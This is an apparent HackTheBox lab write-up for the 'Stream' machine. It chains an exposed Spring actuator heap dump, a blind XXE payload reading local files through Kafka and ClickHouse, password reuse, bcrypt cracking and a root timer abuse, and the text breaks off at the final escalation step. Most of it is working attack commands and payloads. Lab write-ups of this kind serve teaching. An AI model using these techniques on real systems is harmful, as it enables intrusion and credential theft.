# HackTheBox — Stream (Medium / Linux)

**Target IP:** `10.129.xx.xx`
**Attacker (VPN) IP:** `10.10.xx.xx`

---

## 1. Reconnaissance

### 1.1 Nmap Scan

```bash
nmap -sV -sC 10.129.xx.xx
```

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-13 13:25 +0000
Nmap scan report for 10.129.xx.xx
Host is up (0.76s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp   open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://api.htb-airport.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
8081/tcp open  http    Uvicorn
|_http-server-header: uvicorn
|_http-title: Site doesn't have a title (application/json).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.70 seconds
```

**Takeaway:** Three open ports — SSH (22), nginx acting as a reverse proxy (80, redirecting to a vhost), and a raw Uvicorn (Python ASGI/FastAPI-style) service on 8081.

### 1.2 Setting Up the Virtual Host

The nginx redirect pointed to `api.htb-airport.htb`, so this was added to `/etc/hosts`:

```bash
cat /etc/hosts
```

```
10.129.xx.xx    api.htb-airport.htb htb-airport.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

### 1.3 Subdomain Fuzzing

```bash
ffuf -u http://htb-airport.htb -H "Host: FUZZ.htb-airport.htb" \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fw 6
```

```
api                     [Status: 200, Size: 361, Words: 9, Lines: 1, Duration: 526ms]
db                      [Status: 200, Size: 4, Words: 1, Lines: 2, Duration: 510ms]
:: Progress: [5000/5000] :: Job [1/1] :: 134 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
```

Two new vhosts found: `api` and `db`. Added `db.htb-airport.htb` to `/etc/hosts` as well:

```bash
cat /etc/hosts
```

```
10.129.xx.xx    api.htb-airport.htb htb-airport.htb db.htb-airport.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

Visiting `db.htb-airport.htb` revealed a **ClickHouse** HTTP interface. ClickHouse is a very feature-rich database engine (supports remote table functions, file I/O, and more — this becomes important later), but at this point it required credentials, so it was parked for later.

---

## 2. API Enumeration (`api.htb-airport.htb`)

### 2.1 Directory Fuzzing

```bash
ffuf -u http://api.htb-airport.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

```
                        [Status: 200, Size: 361, Words: 9, Lines: 1, Duration: 454ms]
error                   [Status: 500, Size: 68, Words: 1, Lines: 1, Duration: 317ms]
health                  [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 361ms]
status                  [Status: 200, Size: 362, Words: 9, Lines: 1, Duration: 551ms]
:: Progress: [4614/4614] :: Job [1/1] :: 91 req/sec :: Duration: [0:00:46] :: Errors: 0 :
```

Checking each discovered endpoint:

```bash
curl http://api.htb-airport.htb/error | jq
```
```json
{
  "timestamp": "2026-10-15T02:11:59.661Z",
  "status": 999,
  "error": "None"
}
```

```bash
curl http://api.htb-airport.htb/health | jq
```
```json
{
  "status": "Up"
}
```

```bash
curl http://api.htb-airport.htb/status | jq
```
```json
{
  "service": "terminal-edge-gateway",
  "status": "operational",
  "version": "1.0.0",
  "node": "tg-edge-01",
  "region": "eu-central-1",
  "uptime": "0d 1h 35m 23s",
  "upstreams": {
    "flight-data-service": "UP",
    "boarding-control": "UP",
    "gate-assignment": "UP",
    "passenger-manifest": "UP"
  },
  "message": "All terminal gateway systems are operational.",
  "timestamp": "2026-10-15T02:12:28.130697860Z"
}
```

This confirms an airport/airline-themed microservice stack (a "terminal edge gateway"), but nothing immediately exploitable yet. **Note:** the common.txt wordlist was initially the only one used and missed a key endpoint — a second pass with a different wordlist was needed (see below).

### 2.2 Second Fuzzing Pass — Finding the Actuator

```bash
ffuf -u http://api.htb-airport.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/quickhits.txt
```

```
actuator                [Status: 200, Size: 169, Words: 1, Lines: 1, Duration: 622ms]
actuator/heapdump       [Status: 200, Size: 58777106, Words: 0, Lines: 0, Duration: 0ms]
error                   [Status: 500, Size: 68, Words: 1, Lines: 1, Duration: 418ms]
:: Progress: [2565/2565] :: Job [1/1] :: 103 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
```

`actuator/heapdump` is a **Spring Boot Actuator** endpoint. Spring Actuator endpoints, when left exposed/misconfigured, can leak huge amounts of internal application state — in this case, a full JVM heap dump (~58 MB), which commonly contains credentials, session data, and connection strings still resident in memory.

---

## 3. Exploiting the Exposed Heap Dump

### 3.1 Downloading the Heap Dump

```bash
curl http://api.htb-airport.htb/actuator/heapdump -o heapdump
```

```
100 78.41M 100 78.41M   0      0 544.4k      0   02:27   02:27         344.4k
```

```bash
file heapdump
```
```
heapdump: Java HPROF dump, created Wed Oct 14 14:09:07 2026
```

Confirmed: this is a Java HPROF-format heap dump.

### 3.2 Extracting Secrets with JDumpSpider

A heap dump is essentially a raw memory snapshot — searching it manually for strings is slow and noisy. **JDumpSpider** is a purpose-built tool for mining HPROF dumps for credentials (DB connection pools, Spring datasource beans, etc.).

Tool used: [JDumpSpider releases on GitHub](https://github.com/whwlsfb/JDumpSpider/releases/download/dev-20250409T071858/JDumpSpider-1.1-SNAPSHOT-full.jar)

```bash
java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
```

Relevant output:

```
===========================================
SpringDataSourceProperties
-------------
not found!
...
UserPassSearcher
-------------
org.hibernate.dialect.function.json.H2JsonExistsFunction:
[supportsJsonPathPassingClause = true]
...
org.h2.engine.Database:
[databaseName = mem:terminaldb, autoServerMode = false, optimizeReuseResults = true, databaseShortName = TERMINALDB, autoServerPort = 0, databaseURL = jdbc:h2:mem:terminaldb]

com.zaxxer.hikari.pool.HikariPool:
[aliveBypassWindowMs = 500, isUseJdbc4Validation = true]

com.zaxxer.hikari.util.Credentials:
[password = <REDACTED_PW_1>, username = svc_events]
```

**Result:** a HikariCP (JDBC connection pool) credential pair was recovered:

> **Username:** `svc_events`
> **Password:** `<REDACTED_PW_1>`

---

## 4. ClickHouse Access as `svc_events`

### 4.1 Authenticating

Recall `db.htb-airport.htb` is a ClickHouse HTTP interface. The leaked credentials were tried directly:

```bash
curl 'http://db.htb-airport.htb/?user=svc_events&password=<REDACTED_PW_1>' --data-binary 'SELECT version()'
```
```
26.8.1.1746
```

Credentials worked — ClickHouse server version `26.8.1.1746`.

### 4.2 Enumerating the Database

```bash
curl -s 'http://db.htb-airport.htb/?user=svc_events&password=<REDACTED_PW_1>' --data-binary 'SHOW DATABASES'
```
```
partner_feed
```

```bash
curl -s 'http://db.htb-airport.htb/?user=svc_events&password=<REDACTED_PW_1>' --data-binary 'SHOW TABLES'
```
```
flightleg_json
flightleg_json_kafka
flightleg_json_mv
flightleg_raw
flightleg_raw_kafka
flightleg_raw_mv
```

Attempting to read ClickHouse's internal user table (to find other accounts) was denied — proving the account is properly scoped, not an admin:

```bash
curl -s 'http://db.htb-airport.htb/?user=svc_events&password=<REDACTED_PW_1>' --data-binary 'SELECT * FROM system.users'
```
```
Code: 497. DB::Exception: svc_events: Not enough privileges. To execute this query,
it's necessary to have the grant SELECT ON system.users. (ACCESS_DENIED)
(version 26.8.1.1746 (official build))
```

Checking exactly what this account *can* do:

```bash
curl -s 'http://db.htb-airport.htb/?user=svc_events&password=<REDACTED_PW_1>' --data-binary 'SHOW GRANTS'
```
```
GRANT SELECT, INSERT ON partner_feed.* TO svc_events
```

So `svc_events` is limited to `SELECT, INSERT` on the `partner_feed` database only — confirms least-privilege is (mostly) enforced here, which is why a different escalation path was needed later.

### 4.3 Understanding the Table Engines

```bash
curl -s 'http://db.htb-airport.htb/?user=svc_events&password=<REDACTED_PW_1>' \
  --data-binary "SELECT name, engine FROM system.tables WHERE database = 'partner_feed'"
```
```
flightleg_json  MergeTree
flightleg_json_kafka    Kafka
flightleg_json_mv       MaterializedView
flightleg_raw   MergeTree
flightleg_raw_kafka     Kafka
flightleg_raw_mv        MaterializedView
```

### 4.4 Reading Raw Flight-Leg Data

```bash
curl -s 'http://db.htb-airport.htb/?user=svc_events&password=<REDACTED_PW_1>' \
  --data-binary 'SELECT * FROM partner_feed.flightleg_raw LIMIT 1'
```

Output (truncated for readability; full XML was returned as one line):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ns0:IATA_AIDX_FlightLegNotifRQ xmlns:ns0="http://www.iata.org/IATA/2007/00" ...>
  <ns0:Originator CompanyShortName="BAW" TravelSector="A" Code="BA" CodeContext="3"/>
  <ns0:DeliveringSystem CompanyShortName="BAW" Name="OPS-CTL" CodeContext="3"/>
  <ns0:FlightLeg>
    <ns0:LegIdentifier>
      <ns0:Airline CodeContext="3">BA</ns0:Airline>
      <ns0:FlightNumber>286</ns0:FlightNumber>
      <ns0:DepartureAirport CodeContext="3">LHR</ns0:DepartureAirport>
      <ns0:ArrivalAirport CodeContext="3">JFK</ns0:ArrivalAirport>
      ...
    </ns0:LegIdentifier>
    ...
  </ns0:FlightLeg>
</ns0:IATA_AIDX_FlightLegNotifRQ>
```

**Analysis:** This is an **IATA AIDX** (Airline Industry Data Exchange) flight-leg notification message — a real-world XML standard used by airlines/airports to share flight operational data (gates, times, delays, etc.).

### 4.5 Mapping the Data Pipeline

By inspecting the Kafka-engine table DDLs (`flightleg_raw_kafka`, `flightleg_json_kafka`) and the materialized views that feed `flightleg_raw`/`flightleg_json`, the architecture became clear:

```
ingest (HTTP API) → raw XML → Kafka topic "aidx.flightleg.raw.v1"
                                     │
                         (some transformer service parses XML → JSON)
                                     │
                                     ▼
                       Kafka topic "aidx.flightleg.json.v1"
                                     │
                                     ▼
                     ClickHouse table "flightleg_json" (readable by svc_events!)
```

This is the key insight: if XML is ingested somewhere, parsed by a backend service, and the *parsed result* ends up in a table we can read — **that's a built-in exfiltration channel for a blind XXE attack.** We control the input (XML), and we can read the output (via ClickHouse), even though we can't see the transformer's internal output directly.

---

## 5. Discovering and Exploiting the Blind XXE

### 5.1 Finding the Ingest Endpoint

Port 8081 (seen in the initial nmap scan) was queried directly:

```bash
curl -s http://htb-airport.htb:8081 | jq
```
```json
{
  "service": "AIDX flight-leg ingest",
  "what": "Accepts AIDX XML for processing",
  "how": {
    "method": "POST",
    "path": "/feeds/aidx",
    "content_type": "application/xml",
    "max_bytes": 262144
  },
  "required_elements": [
    "IATA_AIDX_FlightLegNotifRQ",
    "Originator",
    "FlightLeg",
    "LegIdentifier"
  ],
  "note": "Ingest does not parse. Full validation happens downstream.",
  "health": "GET /health"
}
```

This confirms the architecture mapped out above: the ingest API (8081) *accepts* XML but explicitly says **"does not parse. Full validation happens downstream."** That downstream parser is the actual attack surface for XXE.

### 5.2 Crafting the XXE Payload

```bash
cat xxe.xml
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<IATA_AIDX_FlightLegNotifRQ>
    <Originator>test</Originator>
    <FlightLeg>
        <LegIdentifier>
            <FlightNumber>&xxe;</FlightNumber>
        </LegIdentifier>
    </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
```

This defines an external entity `&xxe;` that the downstream XML parser (if vulnerable and not disabling DTDs/external entities) will resolve by reading a local file and substituting its content into the `FlightNumber` field.

### 5.3 Submitting the Payload

```bash
curl -si http://htb-airport.htb:8081/feeds/aidx -H 'Content-Type: application/xml' --data-binary @xxe.xml
```
```
HTTP/1.1 202 Accepted
date: Thu, 15 Oct 2026 02:41:21 GMT
server: uvicorn
content-length: 49
content-type: application/json

{"accepted":true,"topic":"aidx.flightleg.raw.v1"}
```

The ingest API just acknowledges receipt (202) and pushes it to Kafka — it doesn't parse, so there's no immediate feedback. This is why it's **blind**: the result of the XXE isn't reflected back in the HTTP response. We have to retrieve it from the downstream `flightleg_json` table instead.

### 5.4 Retrieving the Result via ClickHouse

```bash
curl -sS 'http://db.htb-airport.htb/?user=svc_events&password=<REDACTED_PW_1>' \
  --data-binary "SELECT ingested, JSONExtractString(event, 'leg', 'ufi', 'flight_number') AS content \
  FROM partner_feed.flightleg_json ORDER BY ingested DESC LIMIT 1 FORMAT Vertical"
```

```
Row 1:
──────
ingested: 2026-10-15 02:41:27
content:  root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
_laurel:x:999:988::/var/log/laurel:/bin/false
svc-infra:x:1000:1000:,,,:/home/svc-infra:/bin/bash
clickhouse:x:996:987::/nonexistent:/bin/false
martin_cole:x:1001:1001:,,,:/home/martin_cole:/bin/bash
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

**Confirmed: arbitrary file read via blind XXE**, with the `/etc/passwd` contents smuggled out through the `flight_number` field of the parsed JSON message. Two interesting local users identified: `svc-infra` and `martin_cole`.

### 5.5 Pivoting the XXE to Read Service Configs

With confirmed file-read, the next targets were systemd unit files and application configs, to find service accounts and their credentials.

**Payload:** `file:///etc/systemd/system/kafka.service`

```bash
curl -si http://htb-airport.htb:8081/feeds/aidx -H 'Content-Type: application/xml' --data-binary @xxe.xml
```
```
HTTP/1.1 202 Accepted
...
{"accepted":true,"topic":"aidx.flightleg.raw.v1"}
```

```bash
curl -sS 'http://db.htb-airport.htb/?user=svc_events&password=<REDACTED_PW_1>' \
  --data-binary "SELECT ingested, JSONExtractString(event, 'leg', 'ufi', 'flight_number') AS content \
  FROM partner_feed.flightleg_json ORDER BY ingested DESC LIMIT 1 FORMAT Vertical"
```

```
content:  [Unit]
Description=Apache Kafka Distributed Message Broker
Documentation=https://apache.org
After=network.target

[Service]
Type=simple
User=svc-infra
Group=svc-infra
SupplementaryGroups=kafka-data
WorkingDirectory=/opt/kafka_2.13-4.3.1
ExecStart=/opt/kafka_2.13-4.3.1/bin/kafka-server-start.sh /opt/kafka_2.13-4.3.1/config/server.properties
ExecStop=/opt/kafka_2.13-4.3.1/bin/kafka-server-stop.sh
Restart=on-failure
RestartSec=10s

[Install]
WantedBy=multi-user.target
```

This reveals Kafka runs as `svc-infra` and its real config lives at `/opt/kafka_2.13-4.3.1/config/server.properties` — the next read target, since Kafka config files commonly embed SASL/JAAS credentials in plaintext.

**Payload:** `file:///opt/kafka_2.13-4.3.1/config/server.properties`

```bash
curl -si http://htb-airport.htb:8081/feeds/aidx -H 'Content-Type: application/xml' --data-binary @xxe.xml
```
```
HTTP/1.1 202 Accepted
...
{"accepted":true,"topic":"aidx.flightleg.raw.v1"}
```

```bash
curl -sS 'http://db.htb-airport.htb/?user=svc_events&password=<REDACTED_PW_1>' \
  --data-binary "SELECT ingested, JSONExtractString(event, 'leg', 'ufi', 'flight_number') AS content \
  FROM partner_feed.flightleg_json ORDER BY ingested DESC LIMIT 1 FORMAT Vertical"
```

```
content:  # Licensed to the Apache Software Foundation (ASF) under one or more
...
# The interval at which log segments are checked to see if they can be deleted according
# to the retention policies
log.retention.check.interval.ms=300000
############################# Security #############################
sasl.enabled.mechanisms=PLAIN
listener.name.sasl_plaintext.plain.sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required \
  user_svc_infra="<REDACTED_PW_2>";

authorizer.class.name=org.apache.kafka.metadata.authorizer.StandardAuthorizer
allow.everyone.if.no.acl.found=true
```

**New credential pair recovered:**

> **Username:** `svc_infra`
> **Password:** `<REDACTED_PW_2>`

---

## 6. Initial Shell via SSH (Password Reuse Check)

Since `svc-infra` already appeared as a local system account in `/etc/passwd` (from the earlier XXE read), the natural next step was to check whether the Kafka SASL credential was **reused** as that account's actual login password. This is a common misconfiguration — service accounts often share one password across multiple systems.

```bash
ssh svc-infra@10.129.xx.xx
```
```
The authenticity of host '10.129.xx.xx (10.129.xx.xx)' can't be established.
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.xx.xx' (ED25519) to the list of known hosts.
svc-infra@10.129.xx.xx's password:
Welcome to Ubuntu 24.04.5 LTS (GNU/Linux 6.8.0-146-generic x86_64)
...
Last login: Thu Oct 15 02:49:18 2026 from 10.10.xx.xx
svc-infra@stream:~$ ls
clickhouse-server
```

**Confirmed:** the Kafka SASL password for `svc_infra` was reused as the Linux account password for `svc-infra` — this is the proof the password-reuse hypothesis held, and it gave a foothold shell. At this point, no user flag was readable yet from this account (`ls` only showed a `clickhouse-server` directory — not the flag).

---

## 7. Pivoting from `svc-infra` to `martin_cole`

### 7.1 Enumerating Kafka Topics (Unauthenticated Port)

```bash
svc-infra@stream:~$ /opt/kafka_2.13-4.3.1/bin/kafka-topics.sh --bootstrap-server localhost:9092 --list
```
```
__consumer_offsets
aidx.flightleg.dlq.v1
aidx.flightleg.json.v1
aidx.flightleg.raw.v1
```

Port 9092 only shows the topics already known from ClickHouse. A SASL config file for a second broker listener was created:

```bash
svc-infra@stream:~$ cat /tmp/kafka_sasl.properties
```
```
security.protocol=SASL_PLAINTEXT
sasl.mechanism=PLAIN
sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required username="svc_infra" password="<REDACTED_PW_2>";
```

### 7.2 Enumerating the SASL-Protected Listener (Port 9094)

```bash
svc-infra@stream:~$ /opt/kafka_2.13-4.3.1/bin/kafka-topics.sh --bootstrap-server localhost:9094 \
  --command-config /tmp/kafka_sasl.properties --list
```
```
__consumer_offsets
aidx.flightleg.dlq.v1
aidx.flightleg.json.v1
aidx.flightleg.raw.v1
aidx.identity.json.v1
```

A **new, previously-hidden topic** appears on the authenticated listener: `aidx.identity.json.v1` — clearly interesting, given the name.

### 7.3 Checking Offsets Before Consuming

```bash
svc-infra@stream:~$ /opt/kafka_2.13-4.3.1/bin/kafka-get-offsets.sh --bootstrap-server localhost:9094 \
  --command-config /tmp/kafka_sasl.properties --topic aidx.identity.json.v1
```
```
aidx.identity.json.v1:0:2
aidx.identity.json.v1:1:2
aidx.identity.json.v1:2:2
```

Each of the 3 partitions has messages (offset 2), so there is data to read.

### 7.4 Consuming the Identity Topic

```bash
svc-infra@stream:~$ /opt/kafka_2.13-4.3.1/bin/kafka-console-consumer.sh --bootstrap-server localhost:9094 \
  --command-config /tmp/kafka_sasl.properties --topic aidx.identity.json.v1 --partition 0 --offset 0 --max-messages 5
```
```json
{"user_id":"u-10041","username":"deborah.hernandez","email":"deborah.hernandez@autopilot.htb","password":"<REDACTED_PW_3>","algo":"plaintext","status":"active","roles":["ops"],"created_at":"2025-03-14T09:22:41Z","updated_at":"2025-08-19T11:07:03Z"}
{"user_id":"u-10058","username":"martin_cole","email":"m.okonkwo@aidx.internal","password":"<REDACTED_HASH_1>","algo":"bcrypt","cost":12,"status":"active","roles":["ops.app","flightleg"],"created_at":"2021-05-02T16:48:10Z","updated_at":"2023-08-20T07:55:29Z"}
```

(The other two partitions were checked too, but were empty.)

Two credential records recovered: one plaintext password (for `deborah.hernandez`, not a local system user — not useful here) and a **bcrypt hash for `martin_cole`**, who *is* a local system user seen earlier in `/etc/passwd`.

### 7.5 Cracking the Bcrypt Hash

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
```
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<REDACTED_PW_4>       (?)
1g 0:00:00:01 DONE (2026-10-14 03:43) 0.5882g/s 42.35p/s 42.35c/s 42.35C/s justin..666666
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

John cracked the bcrypt hash against `rockyou.txt` almost instantly (weak/dictionary password).

### 7.6 Switching User

```bash
svc-infra@stream:~$ su - martin_cole
Password:
martin_cole@stream:~$
```

```bash
martin_cole@stream:~$ cat user.txt
```
```
<REDACTED_USER_FLAG>
```

**User flag obtained.**

---

## 8. Privilege Escalation to `root`

### 8.1 Discovering Kopia Backups

```bash
martin_cole@stream:~$ ls
backups  user.txt
```

```bash
martin_cole@stream:~/backups$ ls
_  kopia.blobcfg.f  kopia.maintenance.f  kopia.repository.f  p  q  s  x
```

These are **Kopia** (backup tool) repository files. Kopia keeps encrypted snapshot repositories; if a repository connection is already cached/configured for the current user, snapshots can be listed and restored directly.

```bash
martin_cole@stream:~/backups$ kopia snapshot list
```
```
martin_cole@stream:/home/martin_cole/ch-logs
  2026-08-25 10:21:17 UTC kc43a7ec76aeac204b305df2b777304d1 1.4 MB drwxr-xr-x files:2 dirs:1 (latest-1,hourly-1,daily-1,weekly-1,monthly-1,annual-1)
```

A snapshot of ClickHouse server logs (`ch-logs`) exists — logs can leak credentials typed into failed queries, startup errors, etc.

### 8.2 Restoring the Snapshot

```bash
martin_cole@stream:~/backups$ kopia snapshot restore kc43a7ec76aeac204b305df2b777304d1 /tmp/ch-logs-restore
```
```
Restoring to local filesystem (/tmp/ch-logs-restore) with parallelism=8...
Processed 3 (1.4 MB) of 2 (1.4 MB).
Restored 2 files, 1 directories and 0 symbolic links (1.4 MB).
```

```bash
martin_cole@stream:~/backups$ ls /tmp/ch-logs-restore/
```
```
clickhouse-server.err.log  clickhouse-server.log
```

### 8.3 Mining the Restored Logs for Credentials

```bash
grep -riE 'password|identified by' /tmp/ch-logs-restore/clickhouse-server.err.log
```
```
2026.08.25 10:13:42.753114 [ 1759 ] {9ae1c88a-847e-4425-be98-ec6166c77bb2} <Error> DynamicQueryHandler: Code: 62.
DB::Exception: Double quoted string is not closed: Syntax error: failed at position 1
("ALTER USER default IDENTIFIED BY '<REDACTED_PW_5> ;): "ALTER USER default IDENTIFIED BY '<REDACTED_PW_5> ;.
```

An admin at some point ran `ALTER USER default IDENTIFIED BY '...'` to change the ClickHouse `default` user's password, but the query had a syntax error (an unescaped special character broke the quoting) — and the *error message itself echoed the password back into the log file in plaintext*. This is a classic "secrets in logs" leak.

**New credential recovered:**

> **ClickHouse user:** `default`
> **Password:** `<REDACTED_PW_5>`

### 8.4 Investigating the DLQ Drainer Service

Looking around the box for scheduled/automatic jobs run by root:

```bash
martin_cole@stream:~$ cat /etc/systemd/system/aidx-dlq-drainer.timer
```
```
[Unit]
Description=Run AIDX DLQ drainer every 2 minutes

[Timer]
OnBootSec=1min
OnUnitActiveSec=2min
AccuracySec=15s

[Install]
WantedBy=timers.target
```

A systemd timer runs the DLQ (Dead Letter Queue) drainer every 2 minutes. Its script:

```bash
martin_cole@stream:/opt/ops$ ls -la dlq_drainer.py
```
```
-rwxr--r-- 1 root root 2661 Aug 25 09:48 dlq_drainer.py
```

```bash
martin_cole@stream:/opt/ops$ cat dlq_drainer.py
```
```python
#!/usr/bin/env python3
import os, subprocess, time, uuid
from confluent_kafka import Consumer, KafkaError

KAFKA_BOOTSTRAP = os.environ.get("KAFKA_BOOTSTRAP", "localhost:9092")
DLQ_TOPIC = os.environ.get("DLQ_TOPIC", "aidx.flightleg.dlq.v1")
GROUP_ID = os.environ.get("GROUP_ID", "aidx-dlq-drainer")
QUARANTINE_DIR = os.environ.get("QUARANTINE_DIR", "/var/lib/aidx/quarantine")
FORMATTER = os.environ.get("AIDX_FORMATTER",
                           "/var/lib/clickhouse/user_files/aidx_quarantine.py")
CH_PW_FILE = os.environ.get("CH_PW_FILE", "/etc/partner-sync/ch.pw")
DRAIN_SECONDS = int(os.environ.get("DRAIN_SECONDS", "10"))

def _pw():
    try:
        with open(CH_PW_FILE) as fh: return fh.read().strip()
    except OSError: return ""

def _record(reason, byte_len, root_tag, preview, qfile):
    def esc(s): return s.replace("\\", "\\\\").replace("'", "\\'")
    q = ("INSERT INTO aidx_ops.failed_ingest "
         "(id, reason, byte_len, root_tag, preview, quarantine_path, received_at) "
         f"VALUES ('{esc(uuid.uuid4().hex)}', '{esc(reason)}', {int(byte_len or 0)}, "
         f"'{esc(root_tag)}', '{esc(preview)}', '{esc(qfile)}', now())")
    subprocess.run(["clickhouse-client", "--user", "default",
                    "--password", _pw(), "-q", q], check=False)

def _format(raw):
    p = subprocess.run(["python3", FORMATTER], input=raw,
                       capture_output=True, check=False)
    parts = p.stdout.decode("utf-8", "replace").strip().split("\t")
    return tuple(parts) if len(parts) == 3 else (str(len(raw)), "UNKNOWN", "")

def main():
    os.makedirs(QUARANTINE_DIR, exist_ok=True)
    c = Consumer({"bootstrap.servers": KAFKA_BOOTSTRAP, "group.id": GROUP_ID,
                  "auto.offset.reset": "earliest", "enable.auto.commit": False})
    c.subscribe([DLQ_TOPIC])
    deadline = time.time() + DRAIN_SECONDS
    while time.time() < deadline:
        msg = c.poll(1.0)
        if msg is None: continue
        if msg.error():
            if msg.error().code() == KafkaError._PARTITION_EOF: continue
            continue
        raw = msg.value() or b""
        reason = "unknown"
        for k, v in (msg.headers() or []):
            if k == "reason": reason = (v or b"").decode("utf-8", "replace"); break
        qfile = os.path.join(QUARANTINE_DIR, f"{int(time.time())}_{uuid.uuid4().hex[:8]}.xml")
        try:
            with open(qfile, "wb") as fh: fh.write(raw)
        except OSError: qfile = ""
        byte_len, root_tag, preview = _format(raw)
        _record(reason, byte_len, root_tag, preview, qfile)
        c.commit(msg, asynchronous=False)
    c.close()

if __name__ == "__main__":
    main()
```

**Key insight:** this root-owned script, every 2 minutes, reads messages from the DLQ Kafka topic and — for every message — runs:

```python
subprocess.run(["python3", "/var/lib/clickhouse/user_files/aidx_quarantine.py"], input=raw, ...)
```

In other words, root **executes `/var/lib/clickhouse/user_files/aidx_quarantine.py` as a subprocess** on a timer. If that file can be made to run attacker-controlled code, it is a root-equivalent code execution primitive.

### 8.5 Finding a Write Primitive into ClickHouse's `user_files`

`/var/lib/clickhouse/user_files/` is ClickHouse's dedicated sandbox directory, reachable through the `file()` table function. The previously-cracked `default` user (which has very broad grants, confirmed below) can both read and write files there via SQL.

```bash
curl -sS 'http://db.htb-airport.htb/?user=default&password=<REDACTED_PW_5>' --data-binary "SHOW GRANTS FOR default;"
```
```
GRANT CHECK, SHOW, SELECT, INSERT, ALTER, CREATE, DROP, UNDROP TABLE, TRUNCATE, OPTIMIZE, BACKUP, KILL QUERY, KILL TRANSACTION, MOVE PARTITION BETWEEN SHARDS, ROLE ADMIN, CREATE ROW POLICY, ALTER ROW POLICY, DROP ROW POLICY, CREATE MASKING POLICY, ALTER MASKING POLICY, DROP MASKING POLICY, CREATE QUOTA, ALTER QUOTA, DROP QUOTA, CREATE SETTINGS PROFILE, ALTER SETTINGS PROFILE, DROP SETTINGS PROFILE, ALLOW SQL SECURITY NONE, SHOW ACCESS, SHOW HANDLERS, SYSTEM, dictGet, displaySecretsInShowAndSelect, INTROSPECTION, CLUSTER, FILE, URL, REMOTE, MONGO, REDIS, MYSQL, POSTGRES, SQLITE, ODBC, JDBC, HDFS, S3, HIVE, AZURE, KAFKA, NATS, RABBITMQ, YTSAURUS, ARROW FLIGHT, BIGQUERY, SOURCES ON *.* TO default WITH GRANT OPTION
GRANT SOURCES ON *.* TO default WITH GRANT OPTION
GRANT TABLE ENGINE ON * TO default WITH GRANT OPTION
GRANT SET DEFINER ON * TO default WITH GRANT OPTION
GRANT CREATE USER, ALTER USER, DROP USER, CREATE ROLE, ALTER ROLE, DROP ROLE, IMPERSONATE ON * TO default WITH GRANT OPTION
GRANT ALTER NAMED COLLECTION, CREATE NAMED COLLECTION, DROP NAMED COLLECTION, SHOW NAMED COLLECTIONS, NAMED COLLECTION ON * TO default WITH GRANT OPTION
```

The `FILE` grant confirms `default` can use the `file()` table function for arbitrary read/write in its sandbox directory.

```bash
curl -sS 'http://db.htb-airport.htb/?user=default&password=<REDACTED_PW_5>' --data-binary "SHOW DATABASES;"
```
```
INFORMATION_SCHEMA
aidx_ops
default
information_schema
partner_feed
system
vendor_sync
```

```bash
curl -sS 'http://db.htb-airport.htb/?user=default&password=<REDACTED_PW_5>' --data-binary "DESCRIBE TABLE aidx_ops.failed_ingest;"
```
```
id      String
reason  String
byte_len        UInt32
root_tag        String
preview String
quarantine_path String
received_at     DateTime
```

```bash
curl -sS 'http://db.htb-airport.htb/?user=default&password=<REDACTED_PW_5>' --data-binary "SELECT * FROM aidx_ops.failed_ingest LIMIT 10 FORMAT Vertical;"
```
```
Row 1:
──────
id:              d8fd9829c9014a799bd9d61af734f3c1
reason:          malformed_xml
byte_len:        1970
root_tag:        IATA_AIDX_FlightLegNotifRQ
preview:         <?xml version="1.0" encoding="UTF-8"?> <ns0:IATA_AIDX_FlightLegNotifRQ xmlns:ns0="http://www.iata.org/IATA/2007/00" xmln
quarantine_path: /var/lib/aidx/quarantine/1787815957_5d013ad4.xml
received_at:     2026-08-27 07:32:38
```

This confirms the whole chain traced through the `dlq_drainer.py` source is real and live: malformed XML messages really do end up logged by `aidx_quarantine.py`, which is invoked by root's timer.

### 8.6 The Trick: `INSERT INTO FUNCTION file()` Appends

